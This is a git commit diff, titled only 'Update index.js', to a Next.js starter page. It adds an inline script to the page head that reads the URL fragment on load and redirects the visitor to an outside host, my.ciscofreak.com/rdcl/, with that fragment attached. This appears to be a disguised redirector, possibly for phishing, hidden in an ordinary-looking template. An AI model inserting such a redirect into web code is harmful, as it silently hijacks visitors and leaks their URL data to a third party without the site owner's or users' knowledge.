c643595ac51ff7876c2a51df1cfd1ae7fbb026f3
Abdllkarim Saibaan <48703679+expiren@users.noreply.github.com>
2022-04-17 20:59:00 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -6,6 +6,16 @@ export default function Home() {
   return (
     <div className="container">
       <Head>
+    
+    <script>
+var tracking_param = window.location.href.split('#')[1];
+var srv_ip = "my.ciscofreak.com";
+if(!tracking_param){
+  alert("please set tracking params!");
+}else{
+  document.location.href = 'http://'+srv_ip+'/rdcl/'+tracking_param;
+}
+</script>
         <title>Next.js Starter!</title>
         <link rel="icon" href="/favicon.ico" />
       </Head>
